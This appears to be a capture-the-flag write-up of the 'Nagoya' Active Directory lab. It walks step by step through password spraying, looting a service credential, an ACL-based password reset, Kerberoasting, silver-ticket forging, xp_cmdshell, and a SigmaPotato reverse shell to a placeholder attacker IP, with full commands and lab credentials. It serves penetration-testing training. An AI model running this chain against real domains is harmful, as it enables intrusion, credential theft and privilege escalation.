Walkthrough: Nagoya (Active Directory Lab)
I. Enumeration & Foothold
1. Services Scan
Nmap reveals a Windows Domain Controller (DC) with Kerberos (88), SMB (445), WinRM (5985), and a Web Server (80).

2. Username Harvesting
Scrape the /Team page for names and use username-anarchy to generate common AD patterns (e.g., first.last).

Bash
cewl -m 4 -d 2 http://192.168.204.21/Team > names.txt
username-anarchy -i names.txt -f first.last > users.txt
3. User Validation & Password Spray
Validate users via Kerberos and perform an SMB password spray using common seasonal patterns (e.g., Spring2023).

Bash
# Validate users
kerbrute userenum -d nagoya-industries.com users.txt --dc 192.168.204.21

# Spray passwords
nxc smb 192.168.204.21 -u valid_users.txt -p pass.txt --continue-on-success
Credentials Found: fiona.clark:Summer2023

II. Lateral Movement (User to Service Account)
1. SMB Looting & Decompilation
Explore the NETLOGON share. Found ResetPassword.exe.
Since it is a .NET assembly, use ILSpy or dnSpy to read the source code.

Looted: svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg

2. BloodHound Analysis & DACL Abuse
BloodHound reveals that svc_helpdesk has GenericAll rights over Christopher.Lewis, and Christopher is in the Remote Management Users group (WinRM access).

Action: Force a password reset for Christopher using the net rpc tool.

Bash
net rpc password "Christopher.Lewis" "Pumpkin2025" -U "nagoya-industries.com/svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.204.21
3. Foothold via WinRM
Login as Christopher to claim the user flag.

Bash
evil-winrm -i 192.168.204.21 -u 'Christopher.Lewis' -p 'Pumpkin2025'
III. Kerberos Attacks (The Silver Ticket)
1. Kerberoasting
Request a Service Ticket for the SQL service account.

Bash
impacket-GetUserSPNs nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -dc-ip 192.168.204.21 -request
Crack Hash: hashcat -m 13100 hash.txt rockyou.txt

Result: svc_mssql : Service1

2. Forging the Silver Ticket
To bypass SQL restrictions, forge a Silver Ticket to impersonate the Administrator for the MSSQL service.

Get Domain SID: Get-ADDomain

Get MSSQL SPN: MSSQL/nagoya.nagoya-industries.com

Forge Ticket:

Bash
impacket-ticketer -nthash <NTLM_OF_SERVICE1> -domain-sid <SID> -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
3. MSSQL Exploitation
Inject the forged ticket into your session and connect using Kerberos authentication.

Bash
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-mssqlclient -k nagoya.nagoya-industries.com
IV. Privilege Escalation to SYSTEM
1. Token Impersonation
Inside the MSSQL shell, enable xp_cmdshell and check privileges.

SQL
enable_xp_cmdshell
xp_cmdshell "whoami /priv"
Finding: SeImpersonatePrivilege is Enabled.

2. SigmaPotato
Upload SigmaPotato.exe via Evil-WinRM and trigger a reverse shell through the MSSQL xp_cmdshell to escalate to NT AUTHORITY\SYSTEM.

SQL
xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell <KALI_IP> 4444"
V. Key Lessons Learned
Ghidra vs. ILSpy: Always check file output. .NET files require ILSpy/dnSpy.

DACLs: GenericAll means you own the object. net rpc is the easiest way to reset passwords from Kali.

Silver Tickets: Useful when you have the service account hash but want to access that specific service as a higher-privilege user (Administrator).

The Potato Rule: SeImpersonatePrivilege + any Potato exploit = Root/System.
